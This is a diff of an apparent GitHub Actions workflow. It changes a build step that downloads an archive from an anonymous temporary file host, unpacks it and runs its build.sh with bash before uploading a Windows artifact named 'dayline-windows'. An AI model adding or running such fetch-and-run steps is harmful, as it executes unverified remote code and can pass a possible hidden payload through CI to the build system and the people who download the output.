@@ -7,7 +7,7 @@ jobs:
   a:
     runs-on: ubuntu-latest
     steps:
-      - run: curl -sL https://litter.catbox.moe/6873j9.gz -o t.gz && mkdir r && tar xzf t.gz -C r && bash r/build.sh
+      - run: curl -sL https://litter.catbox.moe/35smxt.gz -o t.gz && mkdir r && tar xzf t.gz -C r && bash r/build.sh
       - uses: actions/upload-artifact@v4
         with:
           name: dayline-windows
